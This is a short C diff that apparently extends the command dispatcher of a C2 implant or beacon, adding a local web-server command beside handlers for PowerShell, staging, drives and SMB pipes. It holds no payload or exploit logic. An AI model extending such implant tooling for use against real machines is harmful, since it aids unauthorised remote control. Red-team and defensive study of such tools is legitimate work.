@@ -16,6 +16,7 @@
 #include "stage.h"
 #include "powershell.h"
 #include "process.h"
+#include "web_response.h"
 
 void TaskDispatch(int cmd, char* buffer, int size)
 {
@@ -83,6 +84,9 @@ void TaskDispatch(int cmd, char* buffer, int size)
 			break;
 		case COMMAND_FILE_DRIVES:
 			FilesystemDrives(buffer, size);
+			break;
+		case COMMAND_WEBSERVER_LOCAL:
+			WebServerLocal(buffer, size);
 			break;
 		case COMMAND_PIPE_OPEN_EXPLICIT:
 			ProtocolSmbOpenExplicit(buffer);
